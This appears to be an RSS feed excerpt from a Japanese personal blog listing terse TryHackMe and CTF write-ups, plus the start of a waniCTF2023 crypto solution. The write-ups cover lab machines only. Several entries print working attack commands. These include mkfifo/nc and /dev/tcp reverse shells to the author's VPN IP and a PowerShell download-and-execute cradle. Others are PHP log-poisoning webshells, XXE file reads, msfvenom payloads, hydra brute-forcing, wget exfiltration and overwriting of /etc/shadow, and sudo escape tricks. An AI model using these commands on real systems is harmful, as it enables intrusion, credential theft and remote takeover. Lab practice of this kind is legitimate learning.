      <description>user SQLi をする ユーザ名が分かってないので，ユーザ名のところで &#39; or 1=1 -- - portal.php ではレビューのデータベースを検索する リクエストを burp でキャッチ sqlmap -r request.txt --dbms=mysql --dump ハッシュパスワードとユーザ名がもらえる ssh できるようになる root ssh ポートフォワーディング ss -tulpn コマンドで 10000 ポートに外部から入る通信がファイアウォールによってブロックされていることが分かる ssh -L 10000:localhost:10000 &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; local で実行する localhost:10000 への通信を，&amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; を経由して localhost:10000 に転送する SSHトンネル ssh -L 127.0.0.1:8080:example.org:80 ssh-server なので，今回の始点と終点は localhost で，ssh-server が agent47 のサーバ </description>
    </item>
    
    <item>
      <title>Alfred</title>
      <link>http://side-realms.github.io/writeup/alfred/</link>
      <pubDate>Sat, 16 Mar 2024 15:31:32 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/alfred/</guid>
      <description>user.txt windows で jenkin が動いている admin admin で通る hydra -l admin -P /usr/share/wordlists/rockyou.txt thm.local -s 8080 http-post-form &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^:F=Invalid&amp;quot; -V -t 64 -I Nishang ローカルの Invoke-PowerShellTcp.ps1 があるディレクトリで http サーバを立てる nc -nlvp 1234 jenkins の config -&amp;gt; ビルド -&amp;gt; windows パッチコマンドの実行 powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port build now でリバースシェルがもらえる switch shell msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o rv.exe ローカルで python3 -m http.server 8001 powershell で powershell &amp;quot;(New-Object System.</description>
    </item>
    
    <item>
      <title>Steel</title>
      <link>http://side-realms.github.io/writeup/steel/</link>
      <pubDate>Sat, 16 Mar 2024 14:11:33 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/steel/</guid>
      <description>初めての windows
user HTTP File Server があるので metasploit で CVE を見つける root windows は PowerUP.ps1 が使える upload /PowerUp.ps1 Invoke-AllChecks AdvancedSystemCareService9 が再起動できるので，悪意ある exe に置き換える msfvenom -p windows/shell_reverse_tcp LHOST=&amp;lt;attacker ip&amp;gt; LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe &amp;ldquo;shell&amp;rdquo; でシェルを起動 sc stop AdvancedSystemCareService9 copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe sc start AdvancedSystemCareService9 </description>
    </item>
    
    <item>
      <title>Mustacchio</title>
      <link>http://side-realms.github.io/writeup/mustacchio/</link>
      <pubDate>Sat, 16 Mar 2024 14:06:52 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/mustacchio/</guid>
      <description> /custom/js/users.bak というファイルがある． admin:~~ みたいなのがあって，パスワードがハッシュ化されているのでクラックする -行き詰ったので nmap -A -p- ultraseek-http みたいなのが 8765 で開いてる admin ログインできる XML コードを入れられる XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY example &amp;#34;XML Injection&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;&amp;amp;example;&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;Test paragraph&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe **SYSTEM** &amp;#39;file:///etc/passwd&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; ソースコードに barry, ssh して！みたいなコメントがあったので &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#39;file:////home/barry/.ssh/id_rsa&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; SSH 鍵をゲット フォーマットがウザい - ----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 ~~~ snip ~~~ 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY----- ssh2john root find / -perm -u=s -type f 2&amp;gt;/dev/null live_log を見つける 権限 s strings で tail を見つける 絶対パスじゃないのでパスを追加 /tmp に tail → /bin/bash を作成 export PATH=”/tmp:$PATH” </description>
    </item>
    
    <item>
      <title>C0ldd</title>
      <link>http://side-realms.github.io/writeup/c0ldd/</link>
      <pubDate>Sat, 16 Mar 2024 14:04:24 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/c0ldd/</guid>
      <description>user wordpress が動いている /hidden C0lld, philip, hugo wpscan --url http://10.10.233.13 -U C0ldd -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 ログインすると apperrance が触れるので，404.php にリバースシェルを貼る cat /var/www/html/wp-config.php Coldd のパスワードが見える su C0ldd root sudo -l で ftp が使える ftp -&amp;gt; !/bin/bash </description>
    </item>
    
    <item>
      <title>Archangel</title>
      <link>http://side-realms.github.io/writeup/archangel/</link>
      <pubDate>Sat, 16 Mar 2024 13:41:58 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/archangel/</guid>
      <description>1st flag metafive.thm /etc/host への追加 2nd flag robots.txt にある disallow にアクセスすると php ページに出る LFI GET /test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd エスケープに気を付ける必要がある /home/archangel/user.txt が露出していたので先に見る PHP ラッパで test.php の中身も見ると 2nd flag がある ?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php user.txt さっきのやつ user2.txt ログポイズニング burp suite でパケットをキャッチ ”User-Agent: &amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;” GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var//log/apache2/access.log&amp;amp;cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2&amp;gt;%261|nc+10.18.127.137+1234+&amp;gt;/tmp/f HTTP/1.1 空白は +, &amp;amp; は %26 にエスケープする local で nc で待ち構えているとリバースシェルがもらえる archangel が user2.txt の権限をもっている crontab /opt/helloworld.sh が動いている echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 4444 &amp;gt;/tmp/f” &amp;gt; /opt/hellowold.sh root.</description>
    </item>
    
    <item>
      <title>Chocolate</title>
      <link>http://side-realms.github.io/writeup/chocolate/</link>
      <pubDate>Sat, 16 Mar 2024 13:28:17 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/chocolate/</guid>
      <description>user FTP に anonymous ログイン steghide で引き出すと base64 エンコードされたパスワードリストがもらえる nmap したときに localhost うんぬん言われたところにアクセスすると key_rev_key をもらえる strings charlie とパスワードで http にログインするとコードを実行できるフォームが見つかる cat /home/charlie/teleport で ssh 鍵をもらう ssh root vi が使える sudo vi -c &#39;:!/bin/sh&#39; /dev/null </description>
    </item>
    
    <item>
      <title>Gamingserver</title>
      <link>http://side-realms.github.io/writeup/gamingserver/</link>
      <pubDate>Sat, 16 Mar 2024 13:24:19 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/gamingserver/</guid>
      <description>user.txt /secret secretKey がある -&amp;gt; ssh 鍵 /uploads dict.lst -&amp;gt; ssh パスワード鍵候補？ ssh2john secretKey &amp;gt; hash.txt john —wordlist=dict.lst hash.txt ssh ログイン ユーザ名はソースコードから読む このパターンどうにかならんのか root.txt john が lxd ユーザなのでこれを使う alpine イメージのビルド git clone https://github.com/saghul/lxd-alpine-builder.git cd .lxd-alpine-builder /build-alpine イメージ作成（管理者権限付き） lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myContainer lxc init myContainer myVM -c security.privileged=true lxc config device add myVM mydevice disk source=/ path=/mnt/root recursive=true 起動 lxc start myVM lxc exec myVM /bin/sh </description>
    </item>
    
    <item>
      <title>Chill</title>
      <link>http://side-realms.github.io/writeup/chill/</link>
      <pubDate>Sat, 16 Mar 2024 11:49:38 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/chill/</guid>
      <description>user.txt gobuster で見つかった /secret にアクセスすると linux コマンドを実行できるサイトが見つかる ls を実行すると are you hacker? っていうアラートが出る pwd;ls だとアラートが出ず，実行結果が見える ここにリバースシェルを入れればいい whoami;php -r &#39;$sock=fsockopen(&amp;quot;your-vpn-ip&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; www-data では何もできない sudo -l で，.helpline.sh が apaar として実行できるっぽい .helpline.sh を見ると，$msg 2&amp;gt;/dev/null が見える /bin/bash を実行すれば apaar としてシェルをもらえる root.txt linpeas.sh 127.0.0.1:9001 が localhost から実行できるらしい で，ここに mysql が動いてる local で ssh-keygen echo &amp;quot;contents of .pub&amp;quot; &amp;gt;&amp;gt; /home/apaar/.ssh/authorized_keys ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa index.php を見ると root とパスワードが載ってる apaar から mysql にログイン mysql -h localhost -u root -p show databese show tables SELECT * FROM users -&amp;gt; anurodh のパスワード customer portal みたいなとこからログインして，images をダウンロードする steghide —extract -sf .</description>
    </item>
    
    <item>
      <title>Wgel</title>
      <link>http://side-realms.github.io/writeup/wgel/</link>
      <pubDate>Sat, 16 Mar 2024 11:43:01 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wgel/</guid>
      <description>user.txt unapp というアプリが使われている searchsploit は特になし /sitemap/.ssh .ssh から id_rsa を持ってくる ssh2john id_rsa &amp;gt; hash.txt ユーザ名はソースコードで jessie ssh -i id_rsa jessie@10.10.217.228 root.txt wget が sudo で使えるらしいが GTFObin ではうまくいかない wget privilege escalation でググる ローカルで nc -lvnp 4444 ターゲットで sudo /usr/bin/wget --post-file=/etc/shadow &amp;lt;local-ip&amp;gt; 4444 /etc/shadow が見えるのでコピーする ローカルで ./shadow.txt とかで保存 ローカルで新しいハッシュを作る openssl passwd -6 -salt &#39;salt&#39; &#39;password’ これを shadow.txt に追記 root:$6$salt$IxDD...DCy.g.:18195:0:99999:7::: これを転送 sudo /usr/bin/wget http://&amp;lt;local-ip&amp;gt;:8000/shadow.txt -O /etc/shadow </description>
    </item>
    
    <item>
      <title>Ignite</title>
      <link>http://side-realms.github.io/writeup/ignite/</link>
      <pubDate>Sat, 16 Mar 2024 11:39:35 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/ignite/</guid>
      <description>user.txt searchsploit fuel CMS RCE URL とプロキシを設定しなおす必要アリ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 1234 &amp;gt; /tmp/f find / 2&amp;gt;/dev/null | grep flag.txt root.txt sudo , crontab, linpeas も特になし 細かく linpeas を見ていく password -&amp;gt; mememe みたいなのがある su で使えてしまう </description>
    </item>
    
    <item>
      <title>Brooklyn</title>
      <link>http://side-realms.github.io/writeup/brooklyn/</link>
      <pubDate>Sat, 16 Mar 2024 11:36:42 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/brooklyn/</guid>
      <description>user.txt FTP jake がユーザー名？ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.10.241 ssh find / 2&amp;gt;/dev/null | grep user.txt root.txt less sudo less /etc/profile !/bin/sh </description>
    </item>
    
    <item>
      <title>Bruteit</title>
      <link>http://side-realms.github.io/writeup/bruteit/</link>
      <pubDate>Sat, 16 Mar 2024 11:33:52 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/bruteit/</guid>
      <description>user.txt ソースコードを見ると admin がある hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.184.144 http-form-post &amp;quot;/admin/:user=^USER^&amp;amp;pass=^PASS^:Username or password invalid id_rsa がもらえる ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 666 id_rsa ssh -i id_rsa john@10.10.184.144 root.txt sudo -l で cat LFILE=/etc/shadow john@bruteit:~$ sudo cat $LFILE root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: これを john で解析する su root </description>
    </item>
    
    <item>
      <title>Skynet</title>
      <link>http://side-realms.github.io/writeup/skynet/</link>
      <pubDate>Sat, 16 Mar 2024 11:17:21 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/skynet/</guid>
      <description>user.txt smb なので enum4linux anonymous milesdyson anonymous でアクセスするとファイルがもらえる パスワードリストをもってくる hydra -l milesdyson -P log1.txt [IP] http-form-post &amp;quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;amp;secretkey=^PASS^&amp;amp;js_autodetect_results=1&amp;amp;just_logged_in=1:Unknown user or password incorrect.&amp;quot; squirrelmail にアクセス )s{A&amp;amp;2Z=F^n_E.B` を受け取る smb に milesdyson でアクセス smbclient //10.10.35.53/milesdyson --user=milesdyson /45kra24zxs28v3yd というディレクトリがあるらしい gobuster dir -u http://10.10.35.53/45kra24zxs28v3yd cuppa が使われている searchsploit cuppa CMS リバースシェルを立てる root.txt crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39; # command to install the new version when you edit this file # and files in /etc/cron.</description>
    </item>
    
    <item>
      <title>Lazyadmin</title>
      <link>http://side-realms.github.io/writeup/lazyadmin/</link>
      <pubDate>Sat, 16 Mar 2024 11:11:11 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/lazyadmin/</guid>
      <description>enum nmap 22:ssh 80:http gobuster content user.txt searchsploit sweetrice cat /usr/share/exploitdb/exploits/php/webapps/40718.txt You can access to all mysql backup and download them from this directory. http://localhost/inc/mysql_backup and can access to website files backup from: http://localhost/SweetRice-transfer.zip mysql のバックアップ？に接続できるらしい http://10.10.61.5/content/inc/mysql_backup/ manager とパスワードのハッシュが見つかる Arbitary file upload みたいなのを実行する http://10.10.61.5/content/attachment/./shell.php5 に php が出てくるのでアクセスするとリバースシェルを獲得できる root.txt sudo -l $ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.</description>
    </item>
    
    <item>
      <title>Bounty</title>
      <link>http://side-realms.github.io/writeup/bounty/</link>
      <pubDate>Sat, 16 Mar 2024 11:06:05 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/bounty/</guid>
      <description>enum nmap 21:ftp 22:ssh ftp locks.txt task.txt user.txt hydra ssh で locks.txt を使う user.txt が見える root.txt sudo -l で ```(root) /bin/tar sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh root.txt ゲット </description>
    </item>
    
    <item>
      <title>Blog</title>
      <link>http://side-realms.github.io/writeup/blog/</link>
      <pubDate>Sat, 16 Mar 2024 10:57:51 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/blog/</guid>
      <description>enum 22:ssh 80:http enum4linux BillySMB という share がある bjoel, smb というユーザーがある SMB BillySMB にパスワード無しで入れる よく分からん .txt と .mp4, .png しかない steghide も特になし wpscan wpscan --url http://10.10.208.138/ -e u ユーザ名が bjoel, kwheel wpscan --url http://10.10.208.138 -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 kwheel:cutiepie1 ssh はできない metasploit search crop-image options で設定するとシェルがもらえる user.txt find / 2&amp;gt;/dev/null | grep user.txt $ cat /home/bjoel/user.txt You won&amp;#39;t find what you&amp;#39;re looking for here. TRY HARDER は？ priviledge escalation find / -perm -u=s -type f 2&amp;gt;/dev/null ls -la /usr/sbin/checker -rwsr-sr-x 1 root root 8432 May 26 2020 /usr/sbin/checker ltrace checker getenv(&amp;#34;admin&amp;#34;) = nil puts(&amp;#34;Not an Admin&amp;#34;) = 13 Not an Admin admin という環境変数があるのでこれを設定してみる ltrace checker getenv(&amp;#34;admin&amp;#34;) = &amp;#34;1&amp;#34; setuid(0) = -1 system(&amp;#34;/bin/bash&amp;#34;) あとは実行してシェルをもらうと root になる </description>
    </item>
    
    <item>
      <title>Cyborg</title>
      <link>http://side-realms.github.io/writeup/cyborg/</link>
      <pubDate>Wed, 21 Feb 2024 07:18:48 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/cyborg/</guid>
      <description>ウェルベルムコトハちゃんの事実を曲げる能力強すぎない？
enum nmap 22/ssh 80/http gobuster /admin /etc ssh /etc にアクセスすると squid プロキシの情報が見れる ユーザ名とパスワードハッシュの組み合わせが見えるのでこれを使う とりあえず john でパスワードを手に入れる ssh にこれを使ったけど通らなかった hydra も通らない http に戻るとバックアップファイルをダウンロードするところがあったのでダウンロードする tar -xvf archive.tar borg というバックアップアプリを使っているらしい borg list /home/kali/THM/home/field/dev/final_archive borg extract /home/kali/THM/home/field/dev/final_archive::music_archive borg の使い方に少し苦労した ユーザ名は alex, パスワードも note.txt に書いてある root.txt ssh する sudo -l で /etc/mp3backups/backup.sh が見つかる while getopts c: flag do case &amp;#34;${flag}&amp;#34; in c) command=${OPTARG};; esac done --- (snip) --- cmd=$($command) echo $cmd -c オプションでコマンドを実行できる(なんのため？) sudo /etc/mp3backups/backup.</description>
    </item>
    
    <item>
      <title>StartUp</title>
      <link>http://side-realms.github.io/writeup/startup/</link>
      <pubDate>Wed, 21 Feb 2024 02:52:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/startup/</guid>
      <description>最近 KAGOME の朝フルーツこれ一本を昼ごはんにしている
健康になった気でいる
enum nmap ftp ssh http gobuster files FTP anonymous ログインができる http から files で中身が見れて，ftp の中身が同期していることが分かる php のリバースシェルを配置する put php-reverse-shell.php シェル とりあえず中に入るとレシピが見れる lennie でログインする必要がある ./incidents ディレクトリ内で .pcapng が手に入る wireshark で .pcapng の TCP ストリームを追うとパスワードが手に入る これが lennie のパスワードだった(!?) あとは user.txt root.txt ./linpeas.sh はすぐに使えそうなものはない．．． ./scripts ディレクトリがあるので探してみる ./planner.sh が root で動作している ./planner.sh が呼び出す ./print.sh は lennie が所有している lennei で print.sh を書き換えて bash を呼び出せば root シェルが手に入る echo &amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/[ip]/8888 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; /etc/print.</description>
    </item>
    
    <item>
      <title>SimpleCTF</title>
      <link>http://side-realms.github.io/writeup/simplectf/</link>
      <pubDate>Wed, 21 Feb 2024 02:31:08 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/simplectf/</guid>
      <description>デュエマ，ゼニスというか昔のキャラが復活しているらしく，非常にやりたい
動画見たら 4t ゼニスとかあって笑った
enum nmap 21/ftp 80/http 2222/ssh gobuster simple CVE CMS 2.2.8 で構成されたサイトが見つかる CVE-2019-9053 で SQLi が通るっぽい PoC を指してuser name と password を手に入れる ssh user.txt が手に入る sudo -l で vim がパスワード無しで使えるらしい sudo vim -c &#39;:!/bin/sh&#39; root.txt が手に入る </description>
    </item>
    
    <item>
      <title>BasicPentesting</title>
      <link>http://side-realms.github.io/writeup/basicpentesting/</link>
      <pubDate>Wed, 21 Feb 2024 02:21:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/basicpentesting/</guid>
      <description>friko, マジでアツい
radio head でもあり bright eyes でもあり全曲の殺意がまんべんなく高い\
enum 22/ssh 80/http 8009/ajp 8080/http-proxy SMB SMB が空いてるようだったのでログインする enum4linux 10.10.77.150 smbclient \\\\10.10.77.150\\Anonymous -U Anonymous more staff.txt user name は Jan ? ssh ssh でブルートフォース hydra -t 16 -l jan -P /usr/share/wordlists/rockyou.txt 10.10.77.150 ssh Jan じゃなくて jan なのキモすぎ，揃えてくれ ssh ログイン Kay が見つかる .ssh が見つかったので id_rsa を持ってきて ssh2john scp jan@10.10.77.150:/home/kay/.ssh/id_rsa ./ - ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 600 ./id_rsa ssh -i id_rsa kay@10.</description>
    </item>
    
    <item>
      <title>RootMe</title>
      <link>http://side-realms.github.io/writeup/rootme/</link>
      <pubDate>Tue, 20 Feb 2024 02:16:10 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/rootme/</guid>
      <description>植峰ノルジュ，最近マジでアツい
マイクラ配信がおもしろすぎる
enum nmap 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) gobuster /panel：ファイルアップロード用 /uploads：アップロードが見える user.txt リバースシェルをアップロードすればいい .php のフィルタがかかっているので .php5 とかにでもしてアップロード root.txt linpeas.sh で /usr/bin/python がヒットしたので GTFObin でみる python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)’ おしまい </description>
    </item>
    
    <item>
      <title>WifiHacking 101</title>
      <link>http://side-realms.github.io/writeup/wifihacking/</link>
      <pubDate>Tue, 20 Feb 2024 02:06:20 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wifihacking/</guid>
      <description>BOØWY，空前の大ブーム
aircrack-ng 4way-handshakeをキャプチャした pcap が得られるので，これをクラックすればいい Aircrack-ng ~~.cap -w ~~.txt で総当たりができるらしいが遅いので，HCAAPX ファイルに変換する方法が使えるらしい aircrack-ng -j wifi ~~.cap aircrack-ng -a2 -b BSSID -w ~~.txt ~~.hccapx え，終わった．．． 手元の環境でもやりたい</description>
    </item>
    
    <item>
      <title>Agent Sudo</title>
      <link>http://side-realms.github.io/writeup/sudoagent/</link>
      <pubDate>Sat, 17 Feb 2024 20:49:48 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/sudoagent/</guid>
      <description>そういえばLerningしかやってなくてマシンを解いてないことに気付いたのでせっかくなら writeup を書きつつやっていく
enum nmap PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) gobuster /.hta (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /.htaccess (Status: 403) [Size: 278] /index.php (Status: 200) [Size: 218] /server-status (Status: 403) [Size: 278] user.</description>
    </item>
    
    <item>
      <title>waniCTF2023</title>
      <link>http://side-realms.github.io/writeup/wanictf2023/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wanictf2023/</guid>
      <description>初心者~中級者の CTF ．個人参加．beginner は全解きしたいのきもちで挑んだが分かりやすい問題が多くて色んな技術にスムーズに入門することができた． これを機に CTF 入門していきたいきもち
waniCTF2023
official writeup
crypto EZDORSA_Lv1 ChatGPT に入れたらできた．すげえ～
EZDORSA_Lv2 e が小さいので RSA の運用的にまずい．RSA の暗号化において $C=M^e\mod N$ だが，ここで $e$ が小さいと $M^e$ も小さくなる． このとき $M &amp;lt; \sqrt[e]{N}$ なら，$M^e &amp;lt; N$ より $\mod N$が関係なくなる． すると $C=M^e$ になるので，$M = \sqrt[e]{C}$ でもとまる
import gmpy2 from Crypto.Util.number import * # 提供されたoutput.txtの内容 n = 25465155563758206895066841861765043433123515683929678836771513150236561026403556218533356199716126886534636140138011492220383199259698843686404371838391552265338889731646514381163372557117810929108511770402714925176885202763093259342499269455170147345039944516036024012941454077732406677284099700251496952610206410882558915139338028865987662513205888226312662854651278789627761068396974718364971326708407660719074895819282719926846208152543027213930660768288888225218585766787196064375064791353928495547610416240104448796600658154887110324794829898687050358437213471256328628898047810990674288648843902560125175884381 e = 7 c = 25698620825203955726406636922651025698352297732240406264195352419509234001004314759538513429877629840120788601561708588875481322614217122171252931383755532418804613411060596533561164202974971066750469395973334342059753025595923003869173026000225212644208274792300263293810627008900461621613776905408937385021630685411263655118479604274100095236252655616342234938221521847275384288728127863512191256713582669212904042760962348375314008470370142418921777238693948675063438713550567626953125 tmp = pow(5, 100, n) c = c // tmp print(tmp) print(c) m,result = gmpy2.</description>
    </item>
    
  </channel>
</rss>
